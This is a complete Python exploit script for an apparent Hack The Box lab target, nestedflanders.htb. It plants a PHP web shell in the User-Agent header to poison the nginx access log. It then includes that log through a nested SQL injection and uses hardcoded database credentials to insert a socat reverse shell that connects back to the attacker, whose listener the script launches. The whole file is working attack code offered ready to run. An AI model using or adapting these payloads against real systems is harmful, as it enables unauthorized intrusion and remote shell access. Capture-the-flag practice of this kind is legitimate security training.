#!/usr/bin/python
__author__ = 'artikrh'
import requests, urllib, socket
import netifaces as ni
from sys import exit
from os import system
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def main():
    s = requests.Session()
    s.get('https://www.nestedflanders.htb',verify=False)

    headers = {
        'Host': 'www.nestedflanders.htb',
        'User-Agent': 'Mozilla/5.0 <?php system($_GET[\'cmd\']); ?>',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
        'DNT': '1',
    }

    cmd = urllib.quote("""mysql -u 'nestedflanders' -p'1036913cf7d38d4ea4f79b050f171e9fbf3f5e' -e 'UPDATE neddy.config SET option_value = "socat exec:\\"bash -li\\",pty,stderr,setsid,sigint,sane tcp:{}:443" WHERE option_name = "checkrelease";'""".format(ip))

    for i in range(1,3):
        try:
            r = s.get("""https://www.nestedflanders.htb/index.php?id=465'+union+all+select+"contact'+union+all+select+'/var/log/nginx/access.log"'&cmd={}""".format(cmd), headers=headers, verify=False, timeout=3)
            code = r.status_code
        except:
            pass
        finally:
            if i == 2:
                if code == 200:
                    print '[*] You should get a shell within 45 seconds'
                    print '[*] Executing: sudo socat file:`tty`,raw,echo=0 tcp-listen:443'
                    cmd = "sudo socat file:`tty`,raw,echo=0 tcp-listen:443"
                    system(cmd)
                else:
                    print '[*] HTTP Error Code: {}'.format(code)


if __name__ == '__main__':
    try:
        ni.ifaddresses('tun0')
        ip = ni.ifaddresses('tun0')[ni.AF_INET][0]['addr']
        socket.gethostbyname('www.nestedflanders.htb')
    except socket.error:
        print '[*] Missing www.nestedflanders.htb entry in /etc/hosts. Exiting...'
        exit()
    except:
        print '[*] Failed to retrieve tun0 IP address. Is your VPN on?'
        exit()

    main()
